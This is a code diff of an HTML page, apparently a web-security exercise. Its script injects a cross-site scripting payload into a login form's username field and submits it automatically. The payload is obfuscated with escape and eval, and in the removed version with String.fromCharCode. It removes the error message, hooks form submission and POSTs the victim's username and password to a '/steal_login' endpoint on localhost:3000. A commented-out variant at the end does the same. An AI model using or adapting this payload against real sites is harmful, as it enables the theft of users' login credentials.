@@ -7,8 +7,22 @@
   </form>  
   <script type="text/javascript">
     userField = document.getElementById("username");
-    userField.value = "a onfocus=document.getElementsByName('username')[0].value='';err=document.getElementsByClassName('error')[0];err.parentNode.removeChild(err);document.forms[0].onsubmit=function(){username=document.getElementsByName('username')[0].value;password=document.getElementsByName('password')[0].value;eval(String.fromCharCode(114,101,113,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41));req.open('POST','http://localhost:3000/steal_login',false);req.send('username='+username+'&password='+password);};";
+    val = "a "
+    val += "id=test "
+    val += "autofocus='autofocus' onfocus=eval(unescape(document.getElementById('test').className)) class="
+    val += escape("document.getElementsByName('username')[0].value='';err=document.getElementsByClassName('error')[0];if(err!=undefined){err.parentNode.removeChild(err);}document.forms[0].onsubmit=function(){usernm=document.getElementsByName('username')[0].value;passwd=document.getElementsByName('password')[0].value;var req = new XMLHttpRequest();req.open('POST','http://localhost:3000/steal_login',false);req.withCredentials=true;req.setRequestHeader('Content-type','application/x-www-form-urlencoded');var paramsStr='username='+usernm+'&password='+passwd;req.send(paramsStr);};")
+   	userField.value = val;
     document.forms[0].submit();
   </script>
 </body>
 </html>
+
+
+
+<!-- 
+c clickthrough
+e escape 
+
+    val = "a autofocus='autofocus' onfocus=document.getElementsByName('username')[0].value='';err=document.getElementsByClassName('error')[0];if(err!=undefined){err.parentNode.removeChild(err);}document.forms[0].onsubmit=function(){username=document.getElementsByName('username')[0].value;password=document.getElementsByName('password')[0].value;req.open('POST','http://localhost:3000/steal_login',false);req.send('username='+username+'&password='+password);};"
+
+-->
